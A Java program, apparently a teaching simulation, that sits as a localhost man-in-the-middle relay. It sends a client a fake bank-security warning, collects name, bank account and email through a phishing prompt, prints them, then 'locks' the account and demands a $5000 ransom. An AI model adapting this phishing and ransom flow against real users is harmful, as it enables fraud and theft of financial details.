import java.io.*;
import java.net.*;
import java.util.concurrent.TimeUnit;

public class MITMRansomware {
    private static final String CORRECT_KEY = "2525";  // Key to unlock client details
    private static final int MAX_ATTEMPTS = 3;         // Maximum allowed attempts
    private static int failedAttempts = 0;
    private static boolean accountLocked = false;      // Track if account is locked

    // Store captured details in obfuscated form
    private static String obfuscatedName;
    private static String obfuscatedBankAccount;
    private static String obfuscatedEmail;
    private static String originalName;
    private static String originalBankAccount;
    private static String originalEmail;

    public static void main(String[] args) throws IOException {
        ServerSocket mitmServerSocket = new ServerSocket(12346); // MITM listens on port 12346
        System.out.println("SERVER BREACHED");

        Socket clientSocket = mitmServerSocket.accept();    // Client connects to MITM
        System.out.println("CLIENT BREACHED");

        Socket serverSocket = new Socket("localhost", 12345);    // MITM connects to real server
        System.out.println("WE ARE LIVE, PREPARE FOR ENGAGEMENT");

        // Handling client-server communication
        new Thread(() -> {
            try {
                simulateRansom(clientSocket, serverSocket);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    private static void simulateRansom(Socket clientSocket, Socket serverSocket) throws IOException {
        BufferedReader clientIn = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        PrintWriter clientOut = new PrintWriter(clientSocket.getOutputStream(), true);
        BufferedReader serverIn = new BufferedReader(new InputStreamReader(serverSocket.getInputStream()));
        PrintWriter serverOut = new PrintWriter(serverSocket.getOutputStream(), true);

        boolean accessBlocked = true;
        String clientMessage;

        // Simulate phishing message
        clientOut.println("WARNING: Unusual login activity detected on your bank account!");
        clientOut.println("To secure your account, please verify your account by proceeding with the below instructions.");
        clientOut.println("Type 'click link' to visit the verification page or ignore to skip.");

        while ((clientMessage = clientIn.readLine()) != null) {
            if (clientMessage.equalsIgnoreCase("click link")) {
                // Simulate capturing sensitive information from the client
                captureClientData(clientOut, clientIn);
                // Optionally, decipher the details after capture
                decipherDetails();
            } else if (accountLocked) {
                // Handle payment after account is locked
                if (clientMessage.equalsIgnoreCase("pay 5000")) {
                    unlockAccount(clientOut);
                } else {
                    clientOut.println("Your account is locked. Type 'pay 5000' to unlock.");
                }
            } else if (accessBlocked) {
                if (clientMessage.equals(CORRECT_KEY)) {
                    accessBlocked = false;
                    clientOut.println("Access restored.");
                } else {
                    failedAttempts++;
                    if (failedAttempts >= MAX_ATTEMPTS) {
                        clientOut.println("Too many incorrect attempts. You have been logged out for security.");
                        clientSocket.close();  // Log the client out by closing the connection
                        System.out.println("Client logged out due to too many failed attempts.");
                        break;
                    } else {
                        clientOut.println("Incorrect key. " + (MAX_ATTEMPTS - failedAttempts) + " attempt(s) left.");
                    }
                }
            } else {
                // Forward client messages to the server
                serverOut.println(clientMessage);
                String serverMessage = serverIn.readLine();
                if (serverMessage != null) {
                    clientOut.println(serverMessage);
                }
            }
        }
    }

    // Simulate a phishing form for the client to enter details
    private static void captureClientData(PrintWriter clientOut, BufferedReader clientIn) throws IOException {
        clientOut.println("Phishing Page - Enter the following details to secure your account:");
        clientOut.println("Enter Name:");
        originalName = clientIn.readLine();
        obfuscatedName = maskData(originalName);

        clientOut.println("Enter Bank Account Number:");
        originalBankAccount = clientIn.readLine();
        obfuscatedBankAccount = maskData(originalBankAccount);

        clientOut.println("Enter Email:");
        originalEmail = clientIn.readLine();
        obfuscatedEmail = maskData(originalEmail);

        // Display the "captured" information in masked format
        System.out.println("Captured Details from Client (Obfuscated):");
        System.out.println("Name: " + obfuscatedName);
        System.out.println("Bank Account: " + obfuscatedBankAccount);
        System.out.println("Email: " + obfuscatedEmail);

        // Countdown before locking the client out
        clientOut.println("Your account has been compromised. Locking your account in 5 seconds...");
        countdownAndLock(clientOut, 5);
    }

    // Mask sensitive information for display
    private static String maskData(String data) {
        return data.replaceAll(".", "*");
    }

    // Countdown and simulate account lock
    private static void countdownAndLock(PrintWriter clientOut, int seconds) {
        try {
            for (int i = seconds; i > 0; i--) {
                clientOut.println("Locking in " + i + " seconds...");
                TimeUnit.SECONDS.sleep(1);
            }
            clientOut.println("Your account has been locked. Payment of $5000 required to unlock.");
            accountLocked = true;  // Set account as locked
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    // Simulate unlocking the account after payment
    private static void unlockAccount(PrintWriter clientOut) {
        accountLocked = false;
        clientOut.println("Payment received. Your account has been unlocked.");
        clientOut.println("-50000$. (HIGH RISK ACCOUNT!! DETECTED SUSPICIOUS ACTIVITIES!!");
        System.out.println("BINGO , MISSION SUCCESS , ABORT ");
    }

    // Method to decipher the client's obfuscated details
    private static void decipherDetails() {
        System.out.println("\nDeciphered Client Details:");
        System.out.println("Name: " + originalName);
        System.out.println("Bank Account: " + originalBankAccount);
        System.out.println("Email: " + originalEmail);
    }
}



